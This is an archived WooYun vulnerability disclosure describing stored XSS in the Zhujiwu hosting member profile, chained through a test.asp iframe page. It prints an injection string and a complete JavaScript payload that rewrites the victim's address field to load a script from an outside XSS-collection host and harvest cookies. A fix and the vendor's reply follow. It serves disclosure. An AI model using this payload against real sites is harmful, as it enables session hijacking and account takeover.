@@ -1,0 +1,313 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		主机屋XSS回旋镖--自插点的利用  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		主机屋XSS回旋镖--自插点的利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xiaoL">xiaoL</a> 
+</li><li>提交时间：		2013-11-08 15:03</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-02：	细节向普通白帽子公开<br/>
+									2013-12-12：	细节向实习白帽子公开<br/>
+									2013-12-23：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">主机屋自插点的利用，这样子的利用可以过了吧。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">主机屋会员中心个人信息<br />
+<br />
+详细地址<br />
+<br />
+联系人<br />
+<br />
+QQ处都存在存储型XSS<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/08144147a3a7c0efda229ebb0f3a6dbc385dce9d.gif" target="_blank"><img src="../images/08144147a3a7c0efda229ebb0f3a6dbc385dce9d.gif" alt="1.gif" width="600"/></a></p><p class="detail"><br />
+<br />
+插入语句<br />
+<br />
+&quot;&gt;&lt;img src=1 onerror=alert(/xss/)&gt;&lt;input type=:hidden<br />
+<br />
+<br />
+<br />
+本来是一个自插的点，查找并没有发现越权修改个人信息的地方（@小川），本来以为就是个鸡肋。<br />
+<br />
+找着找着，发现这么个地址<br />
+<br />
+http://www.zhujiwu.com/test/test.asp<br />
+<br />
+貌似是检查白名单的地方，真不知道这个URL到底干嘛用的。<br />
+<br />
+插入的url参数直接带入了iframe框架src<br />
+<br />
+简直是白送的XSS，这样就可以从这跳跃到自插的位置了。<br />
+<br />
+于是我们构造javascript<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;meta charset=&quot;utf8&quot;&gt;<br />
+&lt;script lnaguage=&quot;javascript&quot;&gt;<br />
+    function createRequest(){<br />
+        var xmlHttp=false;<br />
+    if(window.XMLHttpRequest){<br />
+        xmlHttp = new XMLHttpRequest();<br />
+    }else if(window.ActiveXObject){<br />
+        try{<br />
+            xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);<br />
+        }catch(error1){<br />
+            try{<br />
+                xmlHttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br />
+            }catch(error2){<br />
+                xmlHttp = false;<br />
+            }<br />
+        }<br />
+    }<br />
+        return xmlHttp;<br />
+    }<br />
+    var getAddress;<br />
+    if(getAddress=createRequest()){<br />
+        getAddress.open(&quot;GET&quot;,&quot;/member/account/basic.asp&quot;);<br />
+        getAddress.onreadystatechange=updatePage;<br />
+        getAddress.send(null);    <br />
+    }<br />
+    var xml;<br />
+    function updatePage()<br />
+    {<br />
+        if(getAddress.readyState == 4 )<br />
+        {<br />
+            if(getAddress.status == 200)<br />
+            {<br />
+                var str = getAddress.responseText;<br />
+                rex = /name=&quot;Address&quot; value=&quot;(.*)&quot; size=&quot;38&quot;/;<br />
+                var ttt = rex.exec(str);<br />
+                if(xml=createRequest()){<br />
+                    xml.open(&quot;POST&quot;,&quot;/cmd/member/setBasic.asp?cmd=set&quot;);<br />
+                    xml.onreadystatechange = attack;<br />
+                    var body = &quot;areaID=0&amp;provinceID=1&amp;cityID=1&amp;Address=&quot;+encodeURI(ttt[1])+&quot;%22%3E%3Cscript%20src%3Dhttp%3A%2F%2Fxssl.sinaapp.com%2F0S3c9D%3F1383890465%3E%3C%2Fscript%3E%3Cinput%20type%3D%22hidden&amp;=&amp;LinkMan=asdf&amp;Tel=12345789&amp;QQ=123456789&amp;=%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9&amp;&quot;;<br />
+                    xml.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);<br />
+                    xml.send(body);                <br />
+                }<br />
+            }else if(getAddress.status==404){<br />
+                alert(&quot;404&quot;);<br />
+            }else {<br />
+                alert(&quot;status:&quot;+getAddress.statusText);<br />
+            }<br />
+        }<br />
+    }<br />
+    function attack(){<br />
+        if(xml.readyState == 4 ){<br />
+            if(xml.status == 200){                <br />
+            }<br />
+        }<br />
+    }<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+能够获取当前详细地址，再插入自己的代码，当成伪装了。<br />
+<br />
+<br />
+<br />
+主机屋并没有HTTPonly<br />
+<br />
+<br />
+<br />
+演示最后的过程<br />
+<br />
+<br />
+<br />
+发送我们访问的地址：<br />
+<br />
+http://www.zhujiwu.com/test/test.asp?url=xxxxx.sinaapp.com/xxxx.html<br />
+<br />
+不能暴露sae地址，类似这样的地址。<br />
+<br />
+<br />
+<br />
+原始页面：<br />
+<br />
+</p><p class="detail"><a href="../images/0814425835a17e89d3252cdddc1d360a7a7d77c4.png" target="_blank"><img src="../images/0814425835a17e89d3252cdddc1d360a7a7d77c4.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+访问url后：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/08144325f8f0b5c7456dfab411e0f27cc5e83a32.png" target="_blank"><img src="../images/08144325f8f0b5c7456dfab411e0f27cc5e83a32.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/08144359f1f7a6031931153de0d8fb8be48966ae.png" target="_blank"><img src="../images/08144359f1f7a6031931153de0d8fb8be48966ae.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+收到的cookie<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/08144430bf62b4fdedf828ff1b6975e7f1331401.png" target="_blank"><img src="../images/08144430bf62b4fdedf828ff1b6975e7f1331401.png" alt="7.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">个人信息能看到的人还是很多的，比如管理员啊！<br />
+<br />
+<br />
+<br />
+这样伪装还能永久劫持个人用户！<br />
+<br />
+<br />
+<br />
+如上！ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">编码输出那三个位置就可以了！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xiaoL" title="xiaoL">xiaoL</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-042343" title="主机屋XSS回旋镖--自插点的利用">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-11-12 15:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注主机屋安全，已将此页面删除</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="42343";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
